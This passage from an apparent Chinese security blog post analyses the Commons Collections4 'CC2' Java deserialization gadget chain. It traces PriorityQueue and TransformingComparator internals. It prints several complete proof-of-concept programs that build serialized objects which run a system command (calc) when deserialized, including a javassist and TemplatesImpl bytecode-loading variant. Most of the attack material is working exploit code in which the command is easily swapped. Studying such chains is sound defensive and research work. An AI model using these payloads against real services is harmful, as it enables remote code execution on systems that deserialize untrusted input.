<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"><span class="keyword">import</span> java.util.Comparator;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.Transformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] chainPart = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),<span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),<span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),<span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;),<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>)&#125;;</span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">chain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(chainPart);</span><br><span class="line">        <span class="type">TransformingComparator</span> <span class="variable">comparator1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TransformingComparator</span>(chain);</span><br><span class="line">        <span class="type">PriorityQueue</span> <span class="variable">priority</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>(<span class="number">2</span>,comparator1);</span><br><span class="line">        priority.add(<span class="number">10</span>);</span><br><span class="line">        priority.add(<span class="number">10</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>成功按照预期弹出两个计算机，这是因为TransformingComparator的compare用了两次transformer方法：</p>
<p><img src="/2024/08/13/CC2/image-20240803013121534.png" alt="image-20240803013121534"></p>
<p>那么为了避免这个序列化时弹计算机问题，我们就使用之前说过的先假再反射更改为真的就行了。</p>
<p>想法结束，可行</p>
<p>————</p>
<p>继续分析siftUpUsingComparator代码，现在就跟进一下那个if条件，在我们进入到TransformingComparator的compare后，如上图源码。就算在上面传入真的利用链，最后返回的都是1，所以无论我们add进什么值，最后这里比较的value1和value2都是1，然后调用decorate.compare()方法，可以直接用上面的代码调试，然后到ComparableComparator类的compare()：</p>
<p><img src="/2024/08/13/CC2/image-20240803013918165.png" alt="image-20240803013918165"></p>
<p>然后就直接返回到TransformingComparator的compare()方法&#x3D;&#x3D;》直接退回到add()了，不知道这个compareTo的结果是什么，但是可以加断点看结果：<br><img src="/2024/08/13/CC2/image-20240803014303288.png" alt="image-20240803014303288"></p>
<p>可以知道最后的compareTo的结果是true，导致while循环直接结束，然后就直接给<code>queue[1] = 10</code>了。结合我前面说的，由于我们构造的链子，会导致compareTo比较的值会都是1，直接返回true，<strong>所以其实这里的siftUpUsingComparator()我们可以看作是直接给对应的下标k赋值为x即可</strong>。</p>
</li>
</ul>
<p>——————</p>
<p>offer()方法分析结束，但是我此时想到了PriorityQueue的readObject()方法：<br><img src="/2024/08/13/CC2/image-20240803014846277.png" alt="image-20240803014846277"></p>
<p>前面给过size变量的定义了，可以看出size的值是可以被序列化的，并且从上面的过程可以看出<strong>size的值是和我们add进的值个数是相同的</strong>。这样基本就可以看懂这里的readObject()方法是在干嘛了。</p>
<h4 id="疑问解决"><a href="#疑问解决" class="headerlink" title="疑问解决"></a>疑问解决</h4><p>现在继续分析heapify()方法：<br><img src="/2024/08/13/CC2/image-20240803015410963.png" alt="image-20240803015410963"></p>
<p>就是看会不会进入这个for循环，这里的size正好就是我们前面刚说过的，前面的<code>&gt;&gt;&gt;</code>是按位右移补零操作符，当size为0，1时候i都小于0，这里需要满足size≥2，即我们需要add进两个元素。</p>
<p>那么代码可以改为：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.Transformer;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] fakeTransformer = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>)&#125;;</span><br><span class="line">        Transformer[] chainPart = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),<span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),<span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),<span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;),<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>)&#125;;</span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">chain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(fakeTransformer);</span><br><span class="line">        <span class="type">TransformingComparator</span> <span class="variable">comparator1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TransformingComparator</span>(chain);</span><br><span class="line">        <span class="type">PriorityQueue</span> <span class="variable">priority</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>(<span class="number">2</span>,comparator1);</span><br><span class="line">        priority.add(<span class="number">1</span>);</span><br><span class="line">        priority.add(<span class="number">1</span>);</span><br><span class="line">        </span><br><span class="line">        <span class="type">Field</span> <span class="variable">field1</span> <span class="operator">=</span> ChainedTransformer.class.getDeclaredField(<span class="string">&quot;iTransformers&quot;</span>);</span><br><span class="line">        field1.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field1.set(chain,chainPart);</span><br><span class="line"></span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">out</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.ser&quot;</span>));</span><br><span class="line">        out.writeObject(priority);</span><br><span class="line">        out.close();</span><br><span class="line"></span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">input</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;ser.ser&quot;</span>));</span><br><span class="line">        input.readObject();</span><br><span class="line">        input.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>但是这样已经成功在反序列化的时候弹出两个计算机了。</strong></p>
<p><strong>还是继续跟一下：</strong></p>
<p>所以此时siftDown的参数分别为0和queue[0]的值，也就是1。</p>
<p>然后有效点到了siftDownUsingComparator方法</p>
<p><img src="/2024/08/13/CC2/image-20240803021405137.png" alt="image-20240803021405137"></p>
<p>对应值图里面都有，size就是我们最开始定义的2，剩下的已经很好看懂了，最后就是在第二个if这里成功调用compare()方法从而弹出计算机。</p>
<p>OK，调用链结束。</p>
<p>最终的POC为：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.Transformer;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] fakeTransformer = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>)&#125;;</span><br><span class="line">        Transformer[] chainPart = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),<span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),<span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),<span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;),<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>)&#125;;</span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">chain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(fakeTransformer);</span><br><span class="line">        <span class="type">TransformingComparator</span> <span class="variable">comparator1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TransformingComparator</span>(chain);</span><br><span class="line">        <span class="type">PriorityQueue</span> <span class="variable">priority</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>(<span class="number">2</span>,comparator1);</span><br><span class="line">        priority.add(<span class="number">1</span>);</span><br><span class="line">        priority.add(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">field1</span> <span class="operator">=</span> ChainedTransformer.class.getDeclaredField(<span class="string">&quot;iTransformers&quot;</span>);</span><br><span class="line">        field1.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field1.set(chain,chainPart);</span><br><span class="line"></span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">out</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.ser&quot;</span>));</span><br><span class="line">        out.writeObject(priority);</span><br><span class="line">        out.close();</span><br><span class="line"></span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">input</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;ser.ser&quot;</span>));</span><br><span class="line">        input.readObject();</span><br><span class="line">        input.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="javassist补充"><a href="#javassist补充" class="headerlink" title="javassist补充"></a>javassist补充</h3><p>除了前面的POC，还可以利用到javassist来操作，刚好这里要利用到之前在javassist没说过的利用方法，简单说下，直接看代码和结果就行了：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Haha</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ClassPool</span>  <span class="variable">classPool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">ctClass</span> <span class="operator">=</span> classPool.makeClass(<span class="string">&quot;cat&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> <span class="string">&quot;System.out.println(\&quot;static创建成功\&quot;);&quot;</span>;</span><br><span class="line">        ctClass.makeClassInitializer().insertBefore(cmd);</span><br><span class="line">        ctClass.writeFile(<span class="string">&quot;output&quot;</span>);</span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> ctClass.toClass();</span><br><span class="line">        clazz.newInstance();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>运行后成功在output目录下生成cat.class文件：<br><img src="/2024/08/13/CC2/image-20240803143524351.png" alt="image-20240803143524351"></p>
<p>并且成功输出static创建成功：<br><img src="/2024/08/13/CC2/image-20240803143539153.png" alt="image-20240803143539153"></p>
<p>————————</p>
<p>这里的javassist构造就直接看POC来分析</p>
<p>POC如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassClassPath;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.InvokerTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;org.apache.commons.collections4.functors.InvokerTransformer&quot;</span>).getDeclaredConstructor(String.class);</span><br><span class="line">        constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">InvokerTransformer</span> <span class="variable">transformer</span> <span class="operator">=</span> (InvokerTransformer) constructor.newInstance(<span class="string">&quot;newTransformer&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">TransformingComparator</span> <span class="variable">Tcomparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TransformingComparator</span>(transformer);</span><br><span class="line">        <span class="type">PriorityQueue</span> <span class="variable">queue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//获取默认的ClassPool</span></span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        <span class="comment">//向ClassPool容器插入AbstractTranslet.class</span></span><br><span class="line">        pool.insertClassPath(<span class="keyword">new</span> <span class="title class_">ClassClassPath</span>(AbstractTranslet.class));</span><br><span class="line">        <span class="comment">//创建Cat类</span></span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">cc</span> <span class="operator">=</span> pool.makeClass(<span class="string">&quot;Cat&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> <span class="string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;calc.exe\&quot;);&quot;</span>;</span><br><span class="line">        <span class="comment">//就是创建static默认方法</span></span><br><span class="line">        cc.makeClassInitializer().insertBefore(cmd);</span><br><span class="line">        <span class="comment">//生成一个随机的类名，这里使用了当前系统时间的纳秒部分来确保“唯一性”</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">randomClassName</span> <span class="operator">=</span> <span class="string">&quot;EvilCat&quot;</span> + System.nanoTime();</span><br><span class="line">        <span class="comment">//更改类名，但是应该直接用Cat就行了，但是用来确保唯一性也是可以的</span></span><br><span class="line">        cc.setName(randomClassName);</span><br><span class="line">        <span class="comment">//cc.writeFile();</span></span><br><span class="line">        <span class="comment">//设置cc类的父类</span></span><br><span class="line">        cc.setSuperclass(pool.get(AbstractTranslet.class.getName()));</span><br><span class="line">        </span><br><span class="line">        <span class="type">byte</span>[] classBytes = cc.toBytecode();</span><br><span class="line">        <span class="type">byte</span>[][] code = <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;classBytes&#125;;</span><br><span class="line"></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> TemplatesImpl.class.newInstance();</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_bytecodes&quot;</span>, code);</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;fupanc&quot;</span>);</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_class&quot;</span>, <span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">        Object[] queue_array = <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templates,<span class="number">1</span>&#125;;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">queue_field</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.util.PriorityQueue&quot;</span>).getDeclaredField(<span class="string">&quot;queue&quot;</span>);</span><br><span class="line">        queue_field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        queue_field.set(queue,queue_array);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">size</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.util.PriorityQueue&quot;</span>).getDeclaredField(<span class="string">&quot;size&quot;</span>);</span><br><span class="line">        size.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        size.set(queue,<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">comparator_field</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.util.PriorityQueue&quot;</span>).getDeclaredField(<span class="string">&quot;comparator&quot;</span>);</span><br><span class="line">        comparator_field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        comparator_field.set(queue,Tcomparator);</span><br><span class="line"></span><br><span class="line">            <span class="type">ObjectOutputStream</span> <span class="variable">outputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.ser&quot;</span>));</span><br><span class="line">            outputStream.writeObject(queue);</span><br><span class="line">            outputStream.close();</span><br><span class="line"></span><br><span class="line">            <span class="type">ObjectInputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;ser.ser&quot;</span>));</span><br><span class="line">            inputStream.readObject();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(<span class="keyword">final</span> Object obj, <span class="keyword">final</span> String fieldName, <span class="keyword">final</span> Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">final</span> <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>对于javassist的操作注释已经说很清楚了，从中<strong>给”Cat”类加父类AbstractTranslet就是动态加载字节码里面要求的。</strong></p>
<p>现在来分析一下其他的代码，将中间的javassist直接理解为一个构造类似Test.class的过程，现在来看其他的代码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;org.apache.commons.collections4.functors.InvokerTransformer&quot;</span>).getDeclaredConstructor(String.class);</span><br><span class="line">        constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">InvokerTransformer</span> <span class="variable">transformer</span> <span class="operator">=</span> (InvokerTransformer) constructor.newInstance(<span class="string">&quot;newTransformer&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//直接将InvokerTransformer类实例传给transformer变量</span></span><br><span class="line">        <span class="type">TransformingComparator</span> <span class="variable">Tcomparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TransformingComparator</span>(transformer);</span><br><span class="line">        <span class="type">PriorityQueue</span> <span class="variable">queue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//将CtClass对象转换为字节码</span></span><br><span class="line">        <span class="type">byte</span>[] classBytes = cc.toBytecode();</span><br><span class="line">        <span class="type">byte</span>[][] code = <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;classBytes&#125;;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//这里是正常的能够成功加载字节码的要求</span></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> TemplatesImpl.class.newInstance();</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_bytecodes&quot;</span>, code);</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;fupanc&quot;</span>);</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_class&quot;</span>, <span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">        Object[] queue_array = <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templates,<span class="number">1</span>&#125;;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">queue_field</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.util.PriorityQueue&quot;</span>).getDeclaredField(<span class="string">&quot;queue&quot;</span>);</span><br><span class="line">        queue_field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        queue_field.set(queue,queue_array);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">size</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.util.PriorityQueue&quot;</span>).getDeclaredField(<span class="string">&quot;size&quot;</span>);</span><br><span class="line">        size.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        size.set(queue,<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">comparator_field</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.util.PriorityQueue&quot;</span>).getDeclaredField(<span class="string">&quot;comparator&quot;</span>);</span><br><span class="line">        comparator_field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        comparator_field.set(queue,Tcomparator);</span><br><span class="line"></span><br><span class="line">            <span class="type">ObjectOutputStream</span> <span class="variable">outputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.ser&quot;</span>));</span><br><span class="line">            outputStream.writeObject(queue);</span><br><span class="line">            outputStream.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(<span class="keyword">final</span> Object obj, <span class="keyword">final</span> String fieldName, <span class="keyword">final</span> Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">final</span> <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>分别看代码：<br><img src="/2024/08/13/CC2/image-20240803151124936.png" alt="image-20240803151124936"></p>
<p>这一部分就是获取InvokerTransformer的构造方法，然后将一般在加载字节码时需要用到的<code>newTransformer</code>传进去，这里分别在实例化时用到的方法为：<br><strong>InvokerTransformer</strong>：</p>
<p><img src="/2024/08/13/CC2/image-20240803151256197.png" alt="image-20240803151256197"></p>
<p><strong>TransformingComparator</strong>就是前面讲过的那个。</p>
<p><strong>PriorityQueue</strong>则是：</p>
<p><img src="/2024/08/13/CC2/image-20240803151539067.png" alt="image-20240803151539067"></p>
<p>然后继续看：</p>
<p><img src="/2024/08/13/CC2/image-20240803151718563.png" alt="image-20240803151718563"></p>
<p>这里就是定义了一个数组，为什么是Object[]很好理解，为什么是这个顺序后面会说。</p>
<p>然后调用反射将queue的值更改为这个数组。</p>
<p>后续又是反射来更改size值为2，因为我们没有调用add方法，所以不会让size值增加，我们需要改值。</p>
<p>再后来又是反射修改PriorityQueue的comparator的值为我们的利用链。</p>
